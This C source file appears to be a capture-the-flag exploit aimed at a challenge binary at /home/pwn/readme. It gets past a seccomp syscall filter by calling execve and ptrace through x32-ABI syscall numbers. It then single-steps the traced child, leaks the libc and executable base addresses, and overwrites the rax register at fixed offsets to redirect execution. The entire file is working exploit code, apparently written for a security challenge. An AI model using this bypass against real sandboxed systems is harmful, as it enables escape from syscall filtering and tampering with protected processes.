#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/audit.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

// bypass de filtro de syscall
// https://github.com/torvalds/linux/blob/40c843218f11625722e9a7c3ced81a83b95ecf05/tools/perf/arch/x86/entry/syscalls/syscall_64.tbl#L377
#define __x32BASE 0x40000000
#define __nr_execve (520 + __x32BASE)
#define __nr_ptrace (521 + __x32BASE)
#define README_PATH "/home/pwn/readme"

#define PAUSE getchar()

long __ptrace(enum __ptrace_request request, pid_t pid, void *addr,
              void *data) {
  return syscall(__nr_ptrace, request, pid, addr, data);
}

int __execve(const char *pathname, char *const argv[], char *const envp[]) {
  return syscall(__nr_execve, pathname, argv, envp);
}

int main() {
  // run "write(1, "hello world\n", 14)" to test if x32 syscalls working
  syscall(__x32BASE + 1, 1, "hello, world\n", 13);

  pid_t pid = fork();
  if (pid == 0) {
    puts("forked success");
    long ret = __ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("calling execve");
    fflush(stdout);
    __execve(README_PATH, NULL, NULL);
  } else if (pid < 0) {
    perror("fork failed");
    return -1;
  }
  printf("before child wait return, child pid = %d\n", pid);
  wait(NULL);
  puts("child wait return");

  void *mmap_area = mmap((void *)0x1000000, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANON, -1, 0);
  if (mmap_area == MAP_FAILED) {
    puts("mmap failed");
    exit(EXIT_FAILURE);
  }
  long ret = 0;
  struct user_regs_struct *regs = (struct user_regs_struct *)mmap_area;
  int wstatus;
  unsigned long long libc_base = 0, exe_base = 0;
  // PAUSE;
  int already_show_addrs = 0;
  for (size_t i = 0; i < 100000; i++) {
    ret = __ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
    if (i == 0) {
      printf("ptrace(SINGLESTEP) ret = %ld\n", ret);
    }
    waitpid(pid, &wstatus, 0);
    if (WEXITSTATUS(wstatus) != 5) {
      printf("exit: %d", WEXITSTATUS(wstatus));
      break;
    }
    if (i < 10) {
      printf("wstatus = 0x%x, exit status = %d\n", wstatus,
             WEXITSTATUS(wstatus));
    }

    ret = __ptrace(PTRACE_GETREGS, pid, NULL, regs);
    if (ret < 0) {
      perror("__ptrace");
      break;
    }
    if (i == 0) {
      printf("ptrace(getregs) = %lu\n", ret);
    }
    if (i == 0) {
      libc_base = regs->rip;  // - 0x202b3;
      printf("libc base: %llx\n", libc_base);
    }
    // unsigned char *nun = (unsigned char *)(&regs->rip);
    // if (nun[2] == 0x55 && nun[3] == 0x55 && nun[4] == 0x55 && nun[5] == 0x55) {
    //   printf("f -> %lu\n", i);
    // }
    if (libc_base != 0 && exe_base == 0) {
      if (regs->rip < libc_base - 0x100000000000) {
        exe_base = regs->rip - 0x1060;
        printf("exe base: %llx\n", exe_base);
      }
    }

    if (already_show_addrs == 0 && exe_base != 0 && libc_base != 0) {
      printf("exe: 0x%llx | libc: 0x%llx\n", exe_base, libc_base);
      printf("noflag: 0x%llx\n", exe_base + 0x2014);
      already_show_addrs = 1;
    }

    if (regs->rip >= exe_base + 0x115f && regs->rip < exe_base + 0x116e) {
      regs->rax = regs->rax - 0x10;
      printf("Changing rax: 0x%llx\n", regs->rax);
      ret = __ptrace(PTRACE_SETREGS, pid, 0, regs);
    }
  }
  return 0;
}